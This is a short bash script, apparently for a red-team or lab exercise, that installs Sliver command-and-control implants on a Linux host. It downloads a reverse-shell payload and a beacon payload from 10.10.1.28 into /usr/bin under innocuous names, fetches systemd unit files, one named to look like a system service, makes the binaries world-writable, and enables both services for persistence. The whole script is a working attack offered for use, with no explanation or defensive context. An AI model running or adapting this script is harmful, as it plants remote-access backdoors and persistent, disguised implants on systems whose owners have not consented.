#!/bin/bash

#Rev shell
wget 10.10.1.28/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/start
wget 10.10.1.28/worker.service -O /etc/systemd/system/worker.service

#Beacon
wget 10.10.1.28/sliverPayloads/NOTABLE_FROWN -O /usr/bin/sys
wget 10.10.1.28/systemd-ini.service -O /etc/systemd/system/systemd-ini.service

chmod 777 /usr/bin/start
chmod 777 /usr/bin/sys

sleep 5
systemctl enable worker
systemctl start worker

sleep 5
systemctl enable systemd-ini
systemctl start systemd-ini